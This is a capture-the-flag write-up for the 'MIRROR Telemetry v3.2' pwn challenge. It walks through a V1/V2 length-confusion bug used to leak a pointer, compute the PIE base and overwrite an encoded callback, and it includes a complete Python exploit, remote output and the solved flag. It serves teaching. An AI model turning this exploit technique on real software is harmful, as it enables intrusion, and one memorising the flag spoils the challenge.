# MIRROR 

## Challenge Information

| Field | Details |
|---|---|
| Challenge | MIRROR Telemetry v3.2 |
| Category | Pwn / Binary Exploitation |
| Target | `mirror.chall.rootriet.in:31338` |
| Vulnerability | V1/V2 length confusion |
| Primitive | Information leak + callback overwrite |
| Final Flag | `LUNAR{m1rr0r_m1rr0r_0n_th3_w4ll_sch3m4_c0nfus10n_ftw_2026_e23df3a2}` |

---

## 1. Challenge Overview

The challenge presents a telemetry application called **MIRROR Telemetry v3.2**.

The application exposes the following menu:

```text
1. Queue V1 Message
2. Queue V2 Message
3. Execute Mirror Sync
4. View Telemetry & Logs
5. Reset Session
6. Exit
7. Automated Self-Test (AI Diagnostics Mode)
```

The interesting functionality is the existence of two different message formats:

- V1 messages
- V2 messages

The vulnerability comes from the fact that the legacy mirror-processing code does not interpret the V2 length field consistently with the code that initially accepts the message.

This creates a **length-confusion vulnerability**.

The resulting primitives are:

1. Memory disclosure.
2. PIE address leak.
3. Session-token recovery.
4. Encoded callback overwrite.
5. Control-flow redirection.
6. Access to the privileged telemetry context containing the flag.

---

# 2. Local Artifacts

The provided artifact directory contained several useful files:

```text
analysis_notes.md
archive_listing.txt
artifact_manifest.txt
checksec.txt
disassembly.txt
docker-compose.yml
Dockerfile
exploit.py
key_functions.asm
ldd.txt
local_exploit_transcript.txt
nm.txt
readelf.txt
remote_exploit_transcript.txt
renderers.asm
strings.txt
validation.asm
```

The most important files for exploitation were:

```text
checksec.txt
disassembly.txt
key_functions.asm
renderers.asm
validation.asm
exploit.py
remote_exploit_transcript.txt
```

---

# 3. Binary Reconnaissance

The binary can first be inspected using:

```bash
cat checksec.txt
cat readelf.txt
cat nm.txt
```

The important observation is that the executable uses **PIE**.

Because of PIE, the absolute addresses of functions change between executions.

Therefore, an exploit cannot simply use a fixed address such as:

```text
0x55555555....
```

Instead, we need to recover an address belonging to the binary and calculate the PIE base.

---


<img width="926" height="359" alt="image" src="https://github.com/user-attachments/assets/d2f76a7f-87cf-4755-87a8-ae9c85040661" />


# 4. Understanding the Session

When the program starts, it creates a session and prints a token similar to:

```text
Session Token: 0x63cb373d29df7f03
```

The exploit extracts this value with:

```python
token = int(
    re.search(
        rb'Session Token: 0x([0-9a-f]+)',
        banner
    ).group(1),
    16
)
```

The token is important because the callback pointer used by the application is not stored directly.

Instead, the callback is protected by a session-dependent mask.

Therefore, obtaining the current session token is necessary before constructing the final overwrite.

---

# 5. Identifying the Length-Confusion Bug

The central vulnerability is the interaction between the V1 and V2 message formats.

The exploit contains:

```python
def queue_v1(t, payload):
    t.send(b'1\n1\n%d\n' % len(payload) + payload)
    t.menu()
```

and:

```python
def queue_v2(t, flags, payload):
    t.send(b'2\n1\n%x\n%d\n' % (flags, len(payload)) + payload)
    t.menu()
```

The V2 format contains an additional flags field.

The legacy mirror implementation subsequently interprets the V2 metadata differently.

This creates a mismatch between the amount of data the attacker supplies and the amount of data the mirror subsystem processes.

The important primitive is summarized by the exploit itself:

```python
# Leak the unmasked default callback at g_session+0x230.
# A V2 length of 4 is interpreted as 0x400 by the legacy mirror
# and copies it to output.
```

Thus, a small attacker-controlled V2 message can cause a substantially larger memory region to be copied into the telemetry output.

---

# 6. Obtaining the PIE Leak

The exploit sends:

```python
queue_v2(t, 0, b'LEAK')
```

followed by:

```python
sync(t)
```

and then requests the telemetry:

```python
t.send(b'4\n')
```

The resulting output contains a large mirrored memory region:

```text
[*] Mirrored Stream Content (1024 bytes):
```

The exploit extracts the stream:

```python
marker = b'[*] Mirrored Stream Content (1024 bytes):\n'

stream = leakout.split(marker, 1)[1][:1024]
```

A callback pointer is located at offset:

```text
0x201
```

It is extracted as a little-endian 64-bit value:

```python
default = struct.unpack('<Q', stream[0x201:0x209])[0]
```

The remote run produced:

```text
default = 0x556bc22598a0
```

---

# 7. Calculating the PIE Base

The leaked callback points into the PIE image.

The exploit knows that this callback is located at offset:

```text
0x8a0
```

Therefore:

```python
pie = default - 0x8a0
```

For the successful remote execution:

```text
default = 0x556bc22598a0
```

Therefore:

```text
PIE base = 0x556bc2259000
```

The exploit output confirms:

```text
[+] pie=0x556bc2259000
```

This gives us a reliable base address for calculating other function addresses.

---

# 8. Resetting the Session

The exploit then resets the application:

```python
t.send(b'5\n')
```

The reset is important because it restores the original callback state and generates a new session token.

The exploit therefore extracts the new token again:

```python
reset = t.menu()

token = int(
    re.search(
        rb'Session Token: 0x([0-9a-f]+)',
        reset
    ).group(1),
    16
)
```

The successful remote execution obtained:

```text
token = 0x63cb373d29df7f03
```

---

# 9. Locating the Privileged Callback

The privileged callback is located at a fixed offset inside the PIE binary:

```text
0xcb0
```

Therefore:

```python
privileged = pie + 0xcb0
```

With:

```text
PIE = 0x556bc2259000
```

we obtain:

```text
privileged = 0x556bc2259cb0
```

The exploit confirms:

```text
privileged=0x556bc2259cb0
```

---

# 10. Understanding the Callback Mask

The application does not store the callback directly.

Instead, the callback is encoded using the session token.

The exploit reconstructs the expected masked value with:

```python
masked = privileged ^ (
    token | 0x0101010101010101
)
```

In other words:

```text
masked_callback =
    privileged_callback XOR
    (session_token OR 0x0101010101010101)
```

This is important because simply writing the raw privileged function address would not work.

The attacker must reproduce the encoding expected by the application.

---

# 11. Constructing the V1 Payload

The exploit first queues a V1 message:

```python
queue_v1(
    t,
    b'F' * 3 + struct.pack('<Q', masked)
)
```

Conceptually, the payload is:

```text
FFF
[8-byte encoded callback]
```

The eight-byte value is written in little-endian format using:

```python
struct.pack('<Q', masked)
```

The reason for using V1 here is that its data lands in a telemetry region that can subsequently be consumed by the V2 processing path.

This gives us the data required for the eventual callback overwrite.

---

# 12. Triggering the V2/V1 Overlap

The second message is:

```python
queue_v2(t, 0x10, b'Z')
```

This is the critical operation.

The exploit comments explain the primitive:

```python
# Slot 1 (V2, flags=0x10,len=1) is decoded as 0x110 bytes and copies
# telemetry[3:11] over g_session.renderer_masked at offset 0x108.
```

Thus the sequence is:

```text
V1 message
    |
    +--> place encoded callback in telemetry[3:11]
                              |
                              v
V2 message
    |
    +--> length confusion
    |
    +--> copies telemetry data
                              |
                              v
                  g_session.renderer_masked
                              |
                              v
                    encoded callback
```

The attacker therefore does not need a conventional direct stack return-address overwrite.

Instead, the vulnerability allows an attacker-controlled telemetry region to overwrite the application's **masked renderer callback**.

---

# 13. Executing the Overwrite

The exploit performs:

```python
queue_v1(t, b'F' * 3 + struct.pack('<Q', masked))
queue_v2(t, 0x10, b'Z')
sync(t)
```

Then the telemetry is viewed:

```python
t.send(b'4\n')
```

At this point the callback has been replaced with the encoded privileged callback.

When the application invokes the renderer, the decoded pointer resolves to the privileged routine.

---

# 14. Remote Exploitation

The exploit can be executed remotely with:

```bash
python3 exploit.py --remote
```

The successful remote execution produced:

```text
[*] Mirrored Stream Content (272 bytes):
Z%FFF���Vb�c

[+] PRIVILEGED TELEMETRY CONTEXT ATTAINED
[+] Authenticating mirror token against security enclave...
```

This confirms that the callback overwrite succeeded.

The application then prints the privileged telemetry matrix:

```text
+----------------- SECURE ENCLAVE TELEMETRY MATRIX -----------------+
| ROW 0: [00:L] [04:R] [08:r] [12:_] [16:r] [20:0] [24:h] [28:4] [32:s] [36:m] [40:0] [44:s] [48:_] [52:_] [56:6] [60:3] [64:a] 
| ROW 1: [01:U] [05:{] [09:r] [13:m] [17:0] [21:n] [25:3] [29:l] [33:c] [37:4] [41:n] [45:1] [49:f] [53:2] [57:_] [61:d] [65:2] 
| ROW 2: [02:N] [06:m] [10:0] [14:1] [18:r] [22:_] [26:_] [30:l] [34:h] [38:_] [42:f] [46:0] [50:t] [54:0] [58:e] [62:f] [66:}] 
| ROW 3: [03:A] [07:1] [11:r] [15:r] [19:_] [23:t] [27:w] [31:_] [35:3] [39:c] [43:u] [47:n] [51:w] [55:2] [59:2] [63:3] 
+-------------------------------------------------------------------+
```

---

# 15. Reconstructing the Flag

The matrix stores characters using their numerical indexes.

The exploit extracts each cell with:

```python
cells = re.findall(rb'\[(\d+):(.)\]', final)
```

It then sorts the cells by their index:

```python
flag = b''.join(
    c for _, c in sorted(
        ((int(i), c) for i, c in cells)
    )
)
```

This reconstructs the complete flag.

The telemetry stream length is reported as:

```text
Flag stream length: 67 bytes.
```

Reading the cells in index order gives:

```text
LUNAR{m1rr0r_m1rr0r_0n_th3_w4ll_sch3m4_c0nfus10n_ftw_2026_e23df3a2}
```

---

# 16. Final Flag

```text
LUNAR{m1rr0r_m1rr0r_0n_th3_w4ll_sch3m4_c0nfus10n_ftw_2026_e23df3a2}
```

---

# 17. Exploit Chain Summary

The complete exploitation chain is:

```text
                    MIRROR v3.2
                         |
                         v
              V1 / V2 length mismatch
                         |
                         v
                 Out-of-bounds copy
                         |
                         v
                  Memory disclosure
                         |
                         v
                Leak default callback
                         |
                         v
                 Calculate PIE base
                         |
                         v
                  Reset the session
                         |
                         v
                Obtain session token
                         |
                         v
             Calculate privileged address
                         |
                         v
             Recreate callback encoding
                         |
                         v
            V1 places encoded pointer
                         |
                         v
              V2 length confusion
                         |
                         v
             Callback pointer overwrite
                         |
                         v
                Privileged callback
                         |
                         v
             Secure telemetry context
                         |
                         v
                 Reconstruct cells
                         |
                         v
                       FLAG
```

---

# 18. Important Exploit Values

The successful remote exploitation produced the following values:

```text
PIE base:
0x556bc2259000

Default callback:
0x556bc22598a0

Session token:
0x63cb373d29df7f03

Privileged callback:
0x556bc2259cb0
```

The privileged callback is calculated as:

```text
PIE + 0xcb0
```

while the leaked default callback gives the PIE base through:

```text
default - 0x8a0
```

The masked callback is generated using:

```python
privileged ^ (token | 0x0101010101010101)
```

---

## POC
```
…/mirror-pwn-1789891208/artifacts ❯ cat exploit.py 
#!/usr/bin/env python3
"""MIRROR v3.2 exploit: V2/V1 length-confusion callback overwrite."""
import re
import socket
import struct
import subprocess
import sys

HERE = __import__('pathlib').Path(__file__).resolve().parent.parent
BIN = HERE / 'extracted/mirror/mirror'
PROMPT = b'1. Queue V1 Message'

class Tube:
    def __init__(self, remote=False):
        self.remote = remote
        if remote:
            self.s = socket.create_connection(('mirror.chall.rootriet.in', 31338), timeout=10)
            self.s.settimeout(10)
            self.p = None
        else:
            self.p = subprocess.Popen([str(BIN)], cwd=BIN.parent, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            self.s = None
    def send(self, b):
        (self.s.sendall(b) if self.remote else self.p.stdin.write(b))
        if not self.remote: self.p.stdin.flush()
    def recvuntil(self, needle):
        out = b''
        while needle not in out:
            x = self.s.recv(4096) if self.remote else self.p.stdout.read(1)
            if not x: raise EOFError(out)
            out += x
        return out
    def menu(self): return self.recvuntil(PROMPT)

def queue_v1(t, payload):
    t.send(b'1\n1\n%d\n' % len(payload) + payload)
    t.menu()

def queue_v2(t, flags, payload):
    t.send(b'2\n1\n%x\n%d\n' % (flags, len(payload)) + payload)
    t.menu()

def sync(t):
    t.send(b'3\n'); t.menu()

def run(remote=False):
    t = Tube(remote)
    banner = t.menu()
    token = int(re.search(rb'Session Token: 0x([0-9a-f]+)', banner).group(1), 16)

    # Leak the unmasked default callback at g_session+0x230.  A V2 length of
    # 4 is interpreted as 0x400 by the legacy mirror and copies it to output.
    queue_v2(t, 0, b'LEAK')
    sync(t)
    t.send(b'4\n')
    leakout = t.menu()
    marker = b'[*] Mirrored Stream Content (1024 bytes):\n'
    stream = leakout.split(marker, 1)[1][:1024]
    default = struct.unpack('<Q', stream[0x201:0x209])[0]
    pie = default - 0x8a0

    # Reset restores the original callback and issues a new per-session token.
    t.send(b'5\n')
    reset = t.menu()
    token = int(re.search(rb'Session Token: 0x([0-9a-f]+)', reset).group(1), 16)
    privileged = pie + 0xcb0
    masked = privileged ^ (token | 0x0101010101010101)

    # Slot 0 (V1) seeds telemetry[3:11] with the desired encoded callback.
    # Slot 1 (V2, flags=0x10,len=1) is decoded as 0x110 bytes and copies
    # telemetry[3:11] over g_session.renderer_masked at offset 0x108.
    queue_v1(t, b'F' * 3 + struct.pack('<Q', masked))
    queue_v2(t, 0x10, b'Z')
    sync(t)
    t.send(b'4\n')
    final = t.menu()
    sys.stdout.buffer.write(final)
    cells = re.findall(rb'\[(\d+):(.)\]', final)
    if cells:
        flag = b''.join(c for _, c in sorted(((int(i), c) for i, c in cells)))
        print('\nREAL_FLAG: ' + flag.decode())
    print('\n[+] pie=%#x token=%#x default=%#x privileged=%#x' % (pie, token, default, privileged))

if __name__ == '__main__':
    run('--remote' in sys.argv)
```



# 19. Relevant Exploit Code

The essential parts of the exploit are:

```python
# Leak the default callback
queue_v2(t, 0, b'LEAK')
sync(t)

t.send(b'4\n')

marker = b'[*] Mirrored Stream Content (1024 bytes):\n'
stream = leakout.split(marker, 1)[1][:1024]

default = struct.unpack('<Q', stream[0x201:0x209])[0]

# Calculate PIE
pie = default - 0x8a0

# Reset and obtain a fresh session token
t.send(b'5\n')
reset = t.menu()

token = int(
    re.search(
        rb'Session Token: 0x([0-9a-f]+)',
        reset
    ).group(1),
    16
)

# Calculate privileged callback
privileged = pie + 0xcb0

# Recreate masked callback
masked = privileged ^ (
    token | 0x0101010101010101
)

# Seed telemetry with the encoded callback
queue_v1(
    t,
    b'F' * 3 + struct.pack('<Q', masked)
)

# Trigger V1/V2 length confusion
queue_v2(t, 0x10, b'Z')

# Execute the mirror
sync(t)

# View privileged telemetry
t.send(b'4\n')
final = t.menu()
```

---

# 20. Conclusion

The MIRROR challenge is built around a **legacy V1/V2 length-confusion bug**.

The vulnerability is more than a simple out-of-bounds read: it can be chained into a control-flow hijack.

The complete attack consists of:

1. Abusing V2 length handling to obtain an oversized mirror operation.
2. Leaking a callback pointer.
3. Using the callback leak to calculate the PIE base.
4. Obtaining the session token after resetting the session.
5. Calculating the privileged callback.
6. Recreating the application's callback masking operation.
7. Using a V1 message to place the encoded pointer in telemetry.
8. Using a specially crafted V2 message to copy that telemetry over the masked callback.
9. Triggering the privileged callback.
10. Reading and reconstructing the secure telemetry matrix.

<img width="573" height="94" alt="image" src="https://github.com/user-attachments/assets/1c6e02c1-028f-4ef9-acc8-5010a1ebf7f0" />


The final recovered flag is:

```text
LUNAR{m1rr0r_m1rr0r_0n_th3_w4ll_sch3m4_c0nfus10n_ftw_2026_e23df3a2}
```
